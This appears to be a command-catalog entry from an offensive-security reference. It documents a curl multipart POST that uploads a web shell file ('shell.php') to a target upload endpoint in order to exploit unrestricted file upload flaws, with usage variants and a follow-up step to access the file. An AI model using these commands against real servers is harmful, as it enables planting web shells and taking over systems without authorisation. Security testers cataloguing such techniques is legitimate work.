---
id: cmd-curl-file-upload
data: 'curl -X POST -F "file=@shell.php" https://mars.example.com/upload'
tags:
  - upload
  - web
  - exploit
type: command
output: Upload successful (HTTP 200 or similar response body)
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:13.616Z'
verified: false
validated: true
submitted: true
---
# curl-file-upload

## Command

```bash
curl -X POST -F "file=@shell.php" https://mars.example.com/upload
```

## Description

This command uses curl to perform an HTTP POST multipart form upload of a local file to a target endpoint, exploiting unrestricted file upload vulnerabilities by sending arbitrary files without authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-F "file=@shell.php"` | Uploads the local file shell.php as form field 'file' | Yes |
| `https://mars.example.com/upload` | Target upload endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -F "file=@shell.php" https://target.com/upload
```

### Advanced Usage

```bash
curl -X POST -F "file=@shell.php" -F "description=test" https://target.com/upload --verbose
```

## Expected Output

A successful response like 'File uploaded successfully' or HTTP 200 status, without errors indicating validation failures. For verification, follow up with a GET request to access the file.

## Related

- [[Related Procedure: Exploit-Unrestricted-File-Upload]]
